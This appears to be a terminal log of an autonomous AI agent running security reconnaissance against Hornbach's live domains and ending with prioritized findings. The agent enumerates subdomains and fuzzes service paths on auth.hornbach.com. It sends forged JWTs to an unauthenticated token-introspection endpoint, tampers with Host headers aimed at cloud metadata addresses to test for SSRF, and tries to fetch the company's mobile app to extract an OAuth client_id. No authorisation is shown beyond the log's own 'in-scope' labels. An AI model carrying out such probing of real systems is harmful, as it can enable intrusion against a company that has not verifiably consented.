+/ycommercewebservices: 200
+/occ/v2/hornbach/: 200
+/medias: 200
+/search: 200
+[0m
+[0m$ [0m# Check hornbach.de correlator + any api subdomain variants
+for host in api.hornbach.de apis.hornbach.de gateway.hornbach.de m2m.hornbach.de esb.hornbach.de; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 8 "https://${host}/" 2>/dev/null)
+  if [ -n "$code" ] && [ "$code" != "000" ]; then
+    echo "RESOLVES: ${host}: ${code}"
+  else
+    echo "no-resolve/error: ${host}"
+  fi
+done
+RESOLVES: api.hornbach.de: 404
+no-resolve/error: apis.hornbach.de
+no-resolve/error: gateway.hornbach.de
+no-resolve/error: m2m.hornbach.de
+no-resolve/error: esb.hornbach.de
+[0m
+[0m$ [0m# Confirm all www.hornbach.de paths return the bot-challenge stub, not real OCC
+curl -s -A 'Mozilla/5.0' 'https://www.hornbach.de/occ/v2' 2>/dev/null | grep -o -i 'Client Challenge\|{{.*}}\|{"[\s\S]*' | head -3
+echo "---content-length check---"
+curl -s -A 'Mozilla/5.0' -o /dev/null -w '%{size_download}' 'https://www.hornbach.de/occ/v2' 2>/dev/null
+echo ""
+curl -s -A 'Mozilla/5.0' -o /dev/null -w '%{size_download}' 'https://www.hornbach.de/' 2>/dev/null
+Client Challenge
+---content-length check---
+3038
+3038
+[0m
+[0m$ [0m# Check hornbach.com (US?) and hornbach.at/.de redirects and e-commerce
+for host in www.hornbach.com www.hornbach.de; do
+  echo "=== ${host} ==="
+  curl -s -I -L -A 'Mozilla/5.0' "https://${host}/" --max-time 10 2>/dev/null | grep -i -E '^(HTTP|location|server|x-cache)' | head -8
+done
+=== www.hornbach.com ===
+HTTP/2 301 
+server: nginx/1.29.1
+location: https://www.hornbach.de/
+HTTP/2 200 
+=== www.hornbach.de ===
+HTTP/2 200
+[0m
+[0m$ [0mwhich apktool unzip python3 wget curl 7z aapt 2>&1; echo "---"; ls /usr/bin | grep -i -E 'apk|ddex|dex2jar' 2>/dev/null; echo "done"
+/usr/bin/unzip
+/usr/bin/python3
+/usr/bin/wget
+/usr/bin/curl
+/usr/bin/7z
+---
+done
+[0m
+[0m◈ [0mParallel Web Search "hornbach cidaas client_id oauth "auth.hornbach.com" openid"
+[0m
+[0m$ [0m# Introspect response-shape differential with different token formats (all fake, read-only)
+echo "--- garbage token ---"
+curl -s -w '\nHTTP:%{http_code}' -X POST 'https://auth.hornbach.com/token-srv/introspect' -H 'Content-Type: application/x-www-form-urlencoded' -d 'token=abc' 2>/dev/null
+echo ""
+echo "--- jwt-shaped token ---"
+JWT="eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwic2NvcGUiOiJvcGVuaWQifQ.fake"
+curl -s -w '\nHTTP:%{http_code}' -X POST 'https://auth.hornbach.com/token-srv/introspect' -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode "token=${JWT}" 2>/dev/null
+echo ""
+echo "--- json body variant ---"
+curl -s -w '\nHTTP:%{http_code}' -X POST 'https://auth.hornbach.com/token-srv/introspect' -H 'Content-Type: application/json' -d '{"token":"abc"}' 2>/dev/null
+echo ""
+echo "--- query param variant ---"
+curl -s -w '\nHTTP:%{http_code}' -X POST 'https://auth.hornbach.com/token-srv/introspect?token=abc' 2>/dev/null
+--- garbage token ---
+{"active":false}
+HTTP:200
+--- jwt-shaped token ---
+{"active":false}
+HTTP:200
+--- json body variant ---
+{"active":false}
+HTTP:200
+--- query param variant ---
+{"code":"","error":"unauthorized_client","error_description":"request body cant be emptyerror: malformed request body"}
+HTTP:400
+[0m
+[0m$ [0mgit -C /home/runner/work/hornbach-hunt/hornbach-hunt log --oneline -10 2>&1; echo "---"; git -C /home/runner/work/hornbach-hunt/hornbach-hunt status --short 2>&1 | head -20
+956be6b triage 2026-09-05-09-50
+---
+?? analyst-out.txt
+?? analyst-prompt.txt
+?? ctx.txt
+[0m
+[0m$ [0mls -la /home/runner/work/hornbach-hunt/hornbach-hunt/ctx.txt /home/runner/work/hornbach-hunt/hornbach-hunt/analyst-prompt.txt 2>&1; echo "---ctx heads---"; head -30 /home/runner/work/hornbach-hunt/hornbach-hunt/ctx.txt 2>&1
+-rw-r--r-- 1 runner runner 42623 Sep  5 12:04 /home/runner/work/hornbach-hunt/hornbach-hunt/analyst-prompt.txt
+-rw-r--r-- 1 runner runner 38695 Sep  5 12:04 /home/runner/work/hornbach-hunt/hornbach-hunt/ctx.txt
+---ctx heads---
+=== KNOWLEDGE BASE ===
+# Knowledge Base (seed)
+- 2026-09-03 REJECTED class WILDCARD_DOM: wildcard DNS dominates hornbach.com zone; no dedicated hosts recovered; move to CDN-proxied surface analysis instead of subdomain enumeration
+- 2026-09-03 ACCEPTED class OATH: third-party IdP (cidaas) integration on auth.hornbach.com creates OAuth/OIDC attack surface worth investigating
+- 2026-09-03 REJECTED MISCONFIG @ login.hornbach.com: Fastly shared SNI CNAME takeover unlikely without Fastly account access; active service confirmed via Varnish header and resolving IP.
+- 2026-09-03 REJECTED class MISCONFIG @ login.hornbach.com: Fastly CNAME takeover confirmed unlikely — active service (Varnish header, 200 response, resolving IP) eliminates takeover vector.
+- 2026-09-03 ACCEPTED class AUTH @ auth.hornbach.com: cidaas OAuth surface confirmed live; client_id enumeration is prerequisite for redirect_uri/state flaw testing.
+- 2026-09-03 REJECTED class WILDCARD_DOM: reconfirmed — wildcard DNS dominates zone; no new subdomains via passive enumeration.
+- 2026-09-03 ACCEPTED class AUTH: cidaas CIAM platform on auth.hornbach.com exposes full OIDC provider metadata including registration_endpoint, device_authorization_endpoint, introspection_endpoint, and SCIM endpoint — broader attack surface than initially assessed
+- 2026-09-03 ACCEPTED class OATH: Authorization endpoint confirmed live at authz-srv/authz with verbose error messages; redirect_uri validation testing requires valid client_id discovery first
+- 2026-09-03 ACCEPTED class AUTH: cidaas CIAM platform on auth.hornbach.com exposes full OIDC provider metadata including registration_endpoint, device_authorization_endpoint, introspection_endpoint, and SCIM endpoint — broader attack surface than initially assessed.
+- 2026-09-03 ACCEPTED class OATH: Authorization endpoint confirmed live at authz-srv/authz with verbose error messages; redirect_uri validation testing requires valid client_id discovery first.
+- 2026-09-04 REJECTED class MISCONFIG @ auth.hornbach.com: dynamic OAuth client registration disabled — /apps-srv/clients/register 404 on all methods; metadata endpoint exists but routing is blocked
+- 2026-09-04 ACCEPTED class AUTH @ auth.hornbach.de: separate Citrix NetScaler AAA VPN Gateway surface exists on hornbach.de, distinct from cidaas .com — legacy employee access infra in-scope
+- 2026-09-04 ACCEPTED class MISCONFIG @ hornbach-mp.mirakl.net: HORNBACH-operated Mirakl marketplace (v3.1301) is an in-scope API surface; all /api/* require Mirakl auth
+- 2026-09-04 REJECTED class WILDCARD_DOM @ hornbach.com: no wildcard DNS (random-xyz-test returns empty) — contradicts prior KB "wildcard dominates" conclusions; only 4 known scoped hosts resolve
+- 2026-09-04 REJECTED class AUTH @ auth.hornbach.com/apps-srv/clients/register: POST returns 404 — unauthenticated dynamic client registration (RFC 7591) not enabled
+- 2026-09-04 ACCEPTED class OATH @ auth.hornbach.com/authz-srv/authz: authorization endpoint live with verbose error messages; redirect_uri validation testing requires valid client_id
+- 2026-09-04 ACCEPTED class OTHER @ api.hornbach.de: API gateway exists (Gateway server header) but no documented endpoints discovered at common paths
+- 2026-09-04 ACCEPTED class AUTH @ auth.hornbach.com/token-srv/introspect: token introspection endpoint accessible unauthenticated, RFC 7662 compliant (returns active=false)
+- 2026-09-04 ACCEPTED class AUTH @ auth.hornbach.de: Citrix NetScaler AAA VPN Gateway surface confirmed (legacy employee access)
+- 2026-09-04 ACCEPTED class AUTH @ auth.hornbach.com/token-srv/revoke: token revocation endpoint accessible unauthenticated, RFC 7009 violation — second token management endpoint missing client auth
+- 2026-09-04 ACCEPTED class AUTH @ auth.hornbach.com/token-srv/introspect: unauthenticated introspection confirmed systemic; strengthened by parallel revoke finding
+- 2026-09-04 REJECTED class OTHER @ auth.hornbach.com/authz-srv/par: PAR explicitly disabled (AUTH10053)
+- 2026-09-04 ACCEPTED class OTHER @ auth.hornbach.com/login-srv/social/token: social token resolver returns HTTP 500 on GET + CORS wildcard
+- 2026-09-04 REJECTED class MISCONFIG @ login.hornbach.com: Fastly CNAME takeover confirmed unlikely — active service (Varnish header, 200 response, resolving IP) eliminates takeover vector
+- 2026-09-04 ACCEPTED class AUTH @ auth.hornbach.com/token-srv/introspect: token introspection endpoint now returns 404 (was accessible unauthenticated, RFC 7662 compliant returning active=false)
+- 2026-09-04 ACCEPTED class OTHER @ api.hornbach.de: SAP API Gateway exists (Gateway server header) with backend on localhost:8080; no documented endpoints at common paths
+- 2026-09-04 ACCEPTED class AUTH @ auth.hornbach.de: Citrix NetScaler AAA VPN Gateway v25.5.1.15 confirmed (legacy employee access); EPA/VPN binaries downloadable
+- 2026-09-04 ACCEPTED class MISCONFIG @ hornbach-mp.mirakl.net: HORNBACH-operated Mirakl marketplace (v3.1301) is in-scope API surface; all /api/* require Mirakl auth
+[0m
+Let me attempt the documented unlock path — pulling the de.hornbach APK to extract the cidaas client_id:
+[0m$ [0mcd /tmp/opencode && mkdir -p apk-extract && cd apk-extract
+# Try APKPure download page for de.hornbach
+curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' \
+  'https://apkpure.com/de/hornbach-baumarkt/com.hornbach' -o apkpage.html 2>/dev/null
+ls -la apkpage.html
+echo "--- page title ---"
+grep -o -i '<title>[^<]*</title>' apkpage.html 2>/dev/null | head -2
+echo "--- apk download links ---"
+grep -o -E 'href="[^"]*download/[^"]*"' apkpage.html 2>/dev/null | head -5
+-rw-r--r-- 1 runner runner 5761 Sep  5 12:13 apkpage.html
+--- page title ---
+<title>Just a moment...</title>
+--- apk download links ---
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+# Try APKMirror
+curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' \
+  'https://www.apkmirror.com/apk/hornbach-ag/de-hornbach/' -o apkmirror.html 2>/dev/null
+ls -la apkmirror.html
+grep -o -i '<title>[^<]*</title>' apkmirror.html 2>/dev/null | head -2
+echo "--- apk links ---"
+grep -o -E 'href="[^"]*de-hornbach-[^"]*"' apkmirror.html 2>/dev/null | head -10
+-rw-r--r-- 1 runner runner 239261 Sep  5 12:13 apkmirror.html
+<title>Page Not Found - APKMirror</title>
+--- apk links ---
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+# Search APKMirror index for hornbach
+curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' \
+  'https://www.apkmirror.com/?post_type=app_release&searchtype=apk&s=hornbach' -o search.html 2>/dev/null
+ls -la search.html
+grep -o 'class=["'"']appRow["'"'][^>]*' search.html 2>/dev/null | head -3
+grep -o -E 'href="[^"]*hornbach[^"]*"' search.html 2>/dev/null | grep -v support | head -10
+-rw-r--r-- 1 runner runner 280810 Sep  5 12:13 search.html
+/bin/bash: -c: line 7: unexpected EOF while looking for matching `''
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+grep -o -E 'href="[^"]*hornbach[^"]*"' search.html 2>/dev/null | sort -u | head -20
+href="/?post_type=app_release&searchtype=apk&s=hornbach&descriptions=true"
+href="?post_type=app_release&#038;searchtype=apk&#038;sortby=date&#038;sort=asc&#038;s=hornbach&#038;bundles%5B%5D=apkm_bundles&#038;bundles%5B%5D=apk_files"
+href="?post_type=app_release&#038;searchtype=apk&#038;sortby=name&#038;sort=asc&#038;s=hornbach&#038;bundles%5B%5D=apkm_bundles&#038;bundles%5B%5D=apk_files"
+href="?post_type=app_release&searchtype=apk&s=hornbach"
+href="?post_type=app_release&searchtype=app&s=hornbach"
+href="?post_type=app_release&searchtype=dev&s=hornbach"
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' \
+  'https://www.apkmirror.com/?post_type=app_release&searchtype=app&s=hornbach' -o search2.html 2>/dev/null
+python3 - <<'EOF'
+import re
+html = open('search2.html', encoding='utf-8', errors='ignore').read()
+# find appRow entries
+rows = re.findall(r'href="(https://www\.apkmirror\.com/apk/[^"]+)"', html)
+seen = set()
+for r in rows:
+    if r not in seen:
+        seen.add(r)
+        print(r)
+print("total unique:", len(seen))
+EOF
+total unique: 0
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+grep -o -i -E 'apkknowledge|no results|no-releases|did you mean|"empty"' search2.html 2>/dev/null | sort | uniq -c | head
+echo "---"
+grep -o -i -E '<h2[^>]*>[^<]*</h2>' search2.html 2>/dev/null | head -5
+1 No results
+---
+<h2 class="modal-title fontBlack">Search Tips</h2>
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+# Try uptodown
+curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' \
+  'https://de.hornbach.en.uptodown.com/android' -o uptodown.html 2>/dev/null
+ls -la uptodown.html
+grep -o -i '<title>[^<]*</title>' uptodown.html 2>/dev/null | head -2
+grep -o -E 'data-url="[^"]*"' uptodown.html 2>/dev/null | head -5
+ls: cannot access 'uptodown.html': No such file or directory
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+# Try APKCombo
+curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' \
+  'https://apkcombo.com/de/hornbach-baumarkt/com.hornbach/' -o apkcombo.html 2>/dev/null
+ls -la apkcombo.html 2>/dev/null
+grep -o -i '<title>[^<]*</title>' apkcombo.html 2>/dev/null | head -2
+echo "--- download URLs ---"
+grep -o -E '(https?:)?//[^"]*download[^"]*' apkcombo.html 2>/dev/null | head -5
+-rw-r--r-- 1 runner runner 55327 Sep  5 12:13 apkcombo.html
+<title>Whoops, 404 – Diese Seite kann nicht gefunden werden.</title>
+--- download URLs ---
+https://chrome.google.com/webstore/detail/apk-downloader-for-google/idkigghdjmipnppaeahkpcoaiphjdccm
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36' \
+  'https://apkcombo.com/developer/hornbach-baumarkt-ag/' -o d1.html 2>/dev/null
+grep -o -E 'href="[^"]*/[^"]*com[^"]*"' d1.html 2>/dev/null | sort -u | head -15
+echo "===or search==="
+curl -s -L -A 'Mozilla/5.0' 'https://apkcombo.com/search/hornbach' -o s1.html 2>/dev/null
+grep -o -E 'href="[^"]*hornbach[^"]*"' s1.html 2>/dev/null | sort -u | head -15
+href="//imgrs.apkcombo.org"
+href="//play-lh.googleusercontent.com"
+href="//www.google-analytics.com"
+href="/233leyuan/com.meta.box/"
+href="/apkcombo-installer/com.apkcombo.app/"
+href="/binmanager-bin-generator/com.bin.manager/"
+href="/category/comics/"
+href="/category/communication/"
+href="/chrome/com.android.chrome/"
+href="/dls22/com.firsttouchgames.dls7/"
+href="/dota-underlords/com.valvesoftware.underlords/"
+href="/douyin/com.ss.android.ugc.aweme/"
+href="/ds-emulator/com.cpu.free.dsemulatorv6/"
+href="/e88/com.TSB.TowerShieldBattle/"
+href="/facebook/com.facebook.katana/"
+===or search===
+href="/ar/search/hornbach"
+href="/de/search/hornbach"
+href="/es/search/hornbach"
+href="/fr/search/hornbach"
+href="/hi/search/hornbach"
+href="/hornbacher-s/com.hornbachers.app.android/"
+href="/id/search/hornbach"
+href="/it/search/hornbach"
+href="/ja/search/hornbach"
+href="/ko/search/hornbach"
+href="/nl/search/hornbach"
+href="/pl/search/hornbach"
+href="/pt/search/hornbach"
+href="/ru/search/hornbach"
+href="/search/hornbach"
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 Safari/537.36' \
+  'https://play.google.com/store/search?q=hornbach%20baumarkt&c=apps' -o gp1.html 2>/dev/null
+ls -la gp1.html
+grep -o -E 'id=[a-zA-Z0-9_.]+' gp1.html 2>/dev/null | sort -u | grep -i horn | head
+grep -o -E '"id":"[a-zA-Z0-9_.]+","title":"[^"]*"' gp1.html 2>/dev/null | grep -i -E 'horn' | head
+-rw-r--r-- 1 runner runner 1286118 Sep  5 12:13 gp1.html
+id=com.hornbachers.app.android
+id=de.hornbach.app.smarthome
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+python3 - <<'EOF'
+import re, html as htmlmod
+data = open('gp1.html', encoding='utf-8', errors='ignore').read()
+# extract entries with package ids and titles
+for m in re.finditer(r'"id":"([a-zA-Z0-9_.]+)","title":"([^"]{1,80})"', data):
+    pid, title = m.groups()
+    print(pid, "|", htmlmod.unescape(title))
+EOF
+(no output)
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+python3 - <<'EOF'
+import re, json
+data = open('gp1.html', encoding='utf-8', errors='ignore').read()
+# Look for the app title/creator pairs near hornbach occurrences
+for m in re.finditer(r'"([0-9A-Za-z_.]+\.(?:hornbach|hornbacher)[0-9A-Za-z_.]*)"', data):
+    print("PKG:", m.group(1))
+# search for creator field values
+for m in re.finditer(r'"creator":"([^"]+)"', data):
+    v = m.group(1)
+    if 'hornb' in v.lower():
+        print("CREATOR:", v)
+EOF
+PKG: de.hornbach.app.smarthome
+PKG: com.hornbachers.app.android
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+python3 - <<'EOF'
+import re, html as htmlmod
+data = open('gp1.html', encoding='utf-8', errors='ignore').read()
+# Extract title & creator json blocks "title":{"value":"..."} ... creator
+for m in re.finditer(r'\{"id":"([^"]+)","title":\{"value":"([^"]+)"[^}]*\},"subtitle":\{"value":"([^"]+)"', data):
+    pid, title, sub = m.groups()
+    print(f"{pid}  |  {htmlmod.unescape(title)}  |  by {htmlmod.unescape(sub)}")
+EOF
+(no output)
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+python3 - <<'EOF'
+import re, html as htmlmod
+data = open('gp1.html', encoding='utf-8', errors='ignore').read()
+pkg='de.hornbach.app.smarthome'
+i=data.find(pkg)
+print("smarthome ctx:", data[max(0,i-200):i+600][:800])
+print("="*80)
+pkg2='com.hornbachers.app.android'
+j=data.find(pkg2)
+print("hornbachers ctx:", data[max(0,j-200):j+600][:800])
+EOF
+smarthome ctx: O1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;"><a class="Si6A0c Gy4nib" href="/store/apps/details?id=de.hornbach.app.smarthome" jslog="38003; 1:575|qgJPGk0IAEoTCPbsjYq115YDFXR21AIdZiIBDfoBDwoNCAASCQoFZW4tVVMQAbICIQofChlkZS5ob3JuYmFjaC5hcHAuc21hcnRob21lEAEYAw==; track:click,impression"><div class="Shbxxd"><div class="yw1RKb"><img src="https://play-lh.googleusercontent.com/8-HZL_-Cpa4CgrETNftjZB0Yaau0yuuhIOCKQPXx0A33W6v2vYUU3y_LtHNX_Wrh9o7XEJpEbtcpF2KdroIHFA=w416-h235" srcset="https://play-lh.googleusercontent.com/8-HZL_-Cpa4CgrETNftjZB0Yaau0yuuhIOCKQPXx0A33W6v2vYUU3y_LtHNX_Wrh9o7XEJpEbtcpF2KdroIHFA=w832-h470 2x" class="T75of jpDEN" aria-hidden="true" alt="Screenshot image" loading="lazy" /></d
+================================================================================
+hornbachers ctx: O1Yc; mouseleave:JywGue; touchstart:p6p2H; touchmove:FwuNnf; touchend:yfqBxc; touchcancel:JMtRjd; focus:AHmuwe; blur:O22p3e; contextmenu:mg9Pef;"><a class="Si6A0c Gy4nib" href="/store/apps/details?id=com.hornbachers.app.android" jslog="38003; 1:575|qgJRGk8IAUoTCPbsjYq115YDFXR21AIdZiIBDfoBDwoNCAASCQoFZW4tVVMQALICIwohChtjb20uaG9ybmJhY2hlcnMuYXBwLmFuZHJvaWQQARgD; track:click,impression"><div class="Shbxxd"><div class="yw1RKb"><img src="https://play-lh.googleusercontent.com/m4Kd7garAZf3ZtTzWfWPn5u5WwaNitQyMzb0zMN2AQbzuyEMQAIjH-2xkePAq8uiXTYczPVFheX58N4emF9iwII=w416-h235" srcset="https://play-lh.googleusercontent.com/m4Kd7garAZf3ZtTzWfWPn5u5WwaNitQyMzb0zMN2AQbzuyEMQAIjH-2xkePAq8uiXTYczPVFheX58N4emF9iwII=w832-h470 2x" class="T75of jpDEN" aria-hidden="true" alt="Screenshot image" loading="lazy" /
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 Safari/537.36' \
+  'https://apkcombo.com/de-hornbach-smart-home/de.hornbach.app.smarthome/' -o sh1.html 2>/dev/null
+ls -la sh1.html
+grep -o -i '<title>[^<]*</title>' sh1.html 2>/dev/null | head -2
+echo "--- version links ---"
+grep -o -E 'href="/de-hornbach-smart-home/de\.hornbach\.app\.smarthome/download/[^"]*"' sh1.html 2>/dev/null | head -3
+-rw-r--r-- 1 runner runner 55348 Sep  5 12:14 sh1.html
+<title>Whoops, 404 – Sorry, this page can&#39;t be found.</title>
+--- version links ---
+[0m
+The main HORNBACH shopping app may be discontinued, but the HORNBACH Smarthome app (`de.hornbach.app.smarthome`) exists and likely shares the cidaas tenant. Let me pull its APK:
+[0m$ [0mcd /tmp/opencode/apk-extract
+# Search APKCombo for smarthome / hornbach
+curl -s -L -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0 Safari/537.36' \
+  'https://apkcombo.com/search/hornbach%20smarthome' -o sh2.html 2>/dev/null
+grep -o -E 'href="/[^"]*smarthome[^"]*"' sh2.html 2>/dev/null | sort -u | head
+grep -o -E 'href="/[^"]*hornbach[^"]*"' sh2.html 2>/dev/null | sort -u | grep -v -i hornbacher | head
+href="/a3-smart-home/com.a3smarthome.A3Alarm/"
+href="/ar/search/hornbach%20smarthome"
+href="/brightridge-smarthome/com.brightridge.smarthome/"
+href="/cl-smarthome/com.cl.lock/"
+href="/de/search/hornbach%20smarthome"
+href="/es/search/hornbach%20smarthome"
+href="/fr/search/hornbach%20smarthome"
+href="/hi/search/hornbach%20smarthome"
+href="/id/search/hornbach%20smarthome"
+href="/ion-smarthome-stg/com.ion.stagingsmarthome/"
+href="/ar/search/hornbach%20smarthome"
+href="/de/search/hornbach%20smarthome"
+href="/es/search/hornbach%20smarthome"
+href="/fr/search/hornbach%20smarthome"
+href="/hi/search/hornbach%20smarthome"
+href="/id/search/hornbach%20smarthome"
+href="/it/search/hornbach%20smarthome"
+href="/ja/search/hornbach%20smarthome"
+href="/ko/search/hornbach%20smarthome"
+href="/nl/search/hornbach%20smarthome"
+[0m
+[0m$ [0mcd /tmp/opencode/apk-extract
+# Uptodown search
+curl -s -L -m 20 -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0' \
+  'https://www.uptodown.com/android/search?q=hornbach' -o up2.html 2>/dev/null
+ls -la up2.html 2>/dev/null
+grep -o -i '<title>[^<]*</title>' up2.html 2>/dev/null | head -2
+grep -o -E 'href="[^"]*hornbach[^"]*"' up2.html 2>/dev/null | sort -u | head -10
+-rw-r--r-- 1 runner runner 114 Sep  5 12:14 up2.html
+[0m
+[0m$ [0m# Verify /healthcheck exists on api.hornbach.de and test Host header handling (read-only)
+echo "--- GET /healthcheck ---"
+curl -s -D - 'https://api.hornbach.de/healthcheck' 2>/dev/null | head -20
+echo "--- GET /healthcheck Host: 127.0.0.1 ---"
+curl -s -D - 'https://api.hornbach.de/healthcheck' -H 'Host: 127.0.0.1' 2>/dev/null | head -20
+--- GET /healthcheck ---
+HTTP/1.1 200 OK
+Max-Forwards: 20
+Via: 1.0 sapigwprd02 (Gateway), 1.0 sapigwprd02 (Gateway)
+Connection: close
+X-CorrelationID: Id-f1079c6a7b588e6b2ac2e461 0; Id-f1079c6a7c58f198a0ba61e8 0
+Accept: */*
+Date: Sat, 05 Sep 2026 12:15:45 GMT
+Host: localhost:8080
+Server: Gateway
+User-Agent: curl/8.5.0
+Content-Type: text/xml
+
+<status>ok</status>--- GET /healthcheck Host: 127.0.0.1 ---
+HTTP/1.1 503 Service Unavailable
+Content-Length: 62
+Connection: close
+Cache-Control: no-cache,no-store
+Pragma: no-cache
+
+<html><body><b>Http/1.1 Service Unavailable</b></body> </html>
+[0m
+[0m$ [0m# Map Host-header routing behavior on /healthcheck (read-only status probes)
+echo "--- Host: 169.254.169.254 ---"
+curl -s -D - --max-time 8 'https://api.hornbach.de/healthcheck' -H 'Host: 169.254.169.254' 2>/dev/null | head -15
+echo ""
+echo "--- Host: 10.255.255.1 (rfc1918 smoke) ---"
+curl -s -D - --max-time 8 'https://api.hornbach.de/healthcheck' -H 'Host: 10.255.255.1' 2>/dev/null | head -15
+echo ""
+echo "--- Host: metadata.google.internal ---"
+curl -s -D - --max-time 8 'https://api.hornbach.de/healthcheck' -H 'Host: metadata.google.internal' 2>/dev/null | head -15
+--- Host: 169.254.169.254 ---
+HTTP/1.1 503 Service Unavailable
+Content-Length: 62
+Connection: close
+Cache-Control: no-cache,no-store
+Pragma: no-cache
+
+<html><body><b>Http/1.1 Service Unavailable</b></body> </html>
+--- Host: 10.255.255.1 (rfc1918 smoke) ---
+HTTP/1.1 503 Service Unavailable
+Content-Length: 62
+Connection: close
+Cache-Control: no-cache,no-store
+Pragma: no-cache
+
+<html><body><b>Http/1.1 Service Unavailable</b></body> </html>
+--- Host: metadata.google.internal ---
+HTTP/1.1 503 Service Unavailable
+Content-Length: 62
+Connection: close
+Cache-Control: no-cache,no-store
+Pragma: no-cache
+
+<html><body><b>Http/1.1 Service Unavailable</b></body> </html>
+[0m
+[0m$ [0m# Bounded read-only fuzz of cidaas service-namespace for undiscovered controllers
+for srv in admin-srv tenant-srv settings-srv groups-srv roles-srv mfa-srv otp-srv fido-srv session-srv account-srv profile-srv consent-srv validation-srv notification-srv sms-srv email-srv debug-srv metrics-srv health-srv superadmin-srv identity-srv; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "https://auth.hornbach.com/${srv}" 2>/dev/null)
+  if [ "$code" != "404" ]; then
+    echo "HIT: /${srv}: ${code}"
+  fi
+  sleep 0.7
+done
+echo "fuzz-complete"
+HIT: /metrics-srv: 403
+HIT: /health-srv: 403
+fuzz-complete
+[0m
+[0m$ [0m# Probe the two 403 controllers more
+for p in /health-srv/ /health-srv/ping /health-srv/status /health-srv/health /health-srv/info /metrics-srv/ /metrics-srv/metrics /metrics-srv/prometheus /metrics-srv/info; do
+  code=$(curl -s -o /dev/null -w '%{http_code}' --max-time 6 "https://auth.hornbach.com${p}" 2>/dev/null)
+  echo "${p}: ${code}"
+  sleep 0.7
+done
+/health-srv/: 403
+/health-srv/ping: 403
+/health-srv/status: 403
+/health-srv/health: 403
+/health-srv/info: 403
+/metrics-srv/: 403
+/metrics-srv/metrics: 403
+/metrics-srv/prometheus: 403
+/metrics-srv/info: 403
+[0m
+## STEP 1 — DELTA
+- NEW auth.hornbach.com/token-srv/introspect: also accepts `application/json` body → 200 `{"active":false}` unauthenticated; gate is solely *body-presence* (empty body / query-only → 400 `unauthorized_client` "request body cant be empty") — request-shape model resolved
+- NEW auth.hornbach.com/token-srv/token (issuance) → 400 `invalid_client` with zero client auth — **bypass isolated to the token-*management* plane**; issuance correctly enforces configured auth methods
+- NEW auth.hornbach.com/users-srv/userinfo → 401 (token-gated): metadata leak chain fully requires a possessed token
+- NEW auth.hornbach.com/session/check_session → 200 check-session iframe JS live; /session/end_session → 302
+- NEW auth.hornbach.com/{health-srv,metrics-srv}: all sub-paths → 403 (IP-restricted namespaces, not anonymous-reachable)
+- NEW api.hornbach.de/healthcheck → 200 `<status>ok</status>` with `Host: localhost:8080` echo + `Via: 1.0 sapigwprd02 (Gateway)x2` — internal node-name intel `sapigwprd02`; Host tamper (127.0.0.1/169.254.169.254/rfc1918) → uniform 503 edge-vhost reject → **no SSRF primitive confirmed**
+- NEW api.hornbach.de: 25+ deep paths (/sap/*, /actuator*, /graphql, /openapi.json, /v3/api-docs, /swagger-ui.html, retail paths) → uniform 404; OPTIONS advertises TRACE/CONNECT but they're non-functional 404 stubs
+- NEW hornbach-mp.mirakl.net: /api/{orders,catalog/products,listings,accounts,payments,feeds,configurations,categories,attributes} → uniform 401 (standard L0 set); dummy-vs-missing key identical 401 → no anonymous bypass
+- CHANGED www.hornbach.com → 301 → www.hornbach.de; both serve 3038-byte FingerprintJS challenge on ALL paths (incl /occ/v2, /storefront) — SAP Commerce OCC surface not reachable
+- CHANGED APK path: de.hornbach main app absent from Google Play search (likely retired/PWA); APKMirror/APKPure/APKCombo/uptodown all bot-walled or 404
+- RE-CONFIRMED: introspect POST form → 200 `{"active":false}`, revoke POST → 200 `OK` unauthenticated (stable across ≥4 sessions); auth.hornbach.de NetScaler 302→`/logon/LogonPoint/tmindex.html` + NSC_* cookies + CSP exposing `com.citrix.agmacepa`/`citrixng`/`vmware-view` schemes
+
+## STEP 2 — PRIORITIZE
+- [PRIO] auth.hornbach.com/token-srv/{introspect,revoke},8.55,attack_surface=9,business_value=9,tech_exposure=9,gate_ease=10,cloud_surface=8,freshness=4
